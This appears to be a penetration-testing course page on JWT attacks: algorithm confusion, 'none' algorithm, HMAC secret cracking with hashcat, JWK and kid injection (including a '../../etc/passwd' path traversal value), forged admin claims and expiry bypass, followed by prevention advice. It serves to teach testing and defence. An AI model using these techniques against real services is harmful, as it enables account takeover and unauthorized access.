# JWT Attacks

JSON Web Tokens (JWT) are widely used for authentication and session management. Implementation flaws can lead to complete account takeover.

## JWT Structure

```
header.payload.signature
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.dQw4w9WgXcQ
```

### Header
```json
{"alg": "HS256", "typ": "JWT"}
```

### Payload
```json
{"sub": "user123", "role": "user", "iat": 1516239022, "exp": 1516242622}
```

## Common Attacks

### Algorithm Confusion
Change the algorithm to bypass signature verification.

```python
# Change RS256 (asymmetric) to HS256 (symmetric)
# If the server uses the public key as the HMAC secret...
# Original: {"alg":"RS256"}
# Modified: {"alg":"HS256"}
```

### None Algorithm
```python
# Some JWT libraries accept "none" algorithm
# Modified header: {"alg":"none"}
# Remove signature entirely
token = base64(header) + "." + base64(payload) + "."
```

### Weak HMAC Secret
```bash
# Crack JWT with hashcat
hashcat -m 16500 jwt.txt wordlist.txt

# Use john
python3 jwt_tool.py jwt.txt -C -d wordlist.txt
```

### JWK Injection
Some servers accept embedded JWK (JSON Web Key) in the header.

```json
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "n": "YOUR_PUBLIC_MODULUS",
    "e": "AQAB"
  }
}
```

If the server trusts the embedded key, you can sign tokens with a key you control.

### Kid Injection
The `kid` (Key ID) header is used to look up the verification key.

```json
{
  "alg": "HS256",
  "kid": "../../etc/passwd"    # Path traversal to use file as key
}
```

Or use SQL injection in kid to retrieve a known value.

### Claims Manipulation
```json
// Original
{"sub": "user", "role": "user", "iat": 1516239022}

// Modified
{"sub": "admin", "role": "admin", "iat": 1516239022}
```

### Token Expiration Bypass
- Set `exp` to far-future date
- Remove `exp` claim entirely
- Set `nbf` (not before) to past date

### Cross-Service Relay
Token issued for service A is valid for service B due to missing audience verification.

## Tools

| Tool | Purpose |
|------|---------|
| **jwt_tool** | Comprehensive JWT attack toolkit |
| **jwt-cracker** | HMAC secret brute-force |
| **jwt.io** | Debugger and decoder |
| **Burp JWT Editor** | Modify JWTs in Burp Suite |
| **hashcat** | JWT hash cracking (mode 16500) |

## Prevention

1. **Restrict algorithms** — Never accept "none" algorithm
2. **Validate algorithm** — Compare expected vs received algorithm
3. **Use asymmetric keys** — RS256/ES256 with secure key storage
4. **Validate all claims** — `sub`, `exp`, `nbf`, `aud`, `iss`
5. **Short expiration** — 15-60 minutes, use refresh tokens
6. **Don't store secrets in JWTs**
7. **Use JWT libraries** — Don't implement your own

---

> **Next Section**: [Reporting](../06-Reporting/01-report-writing.md)
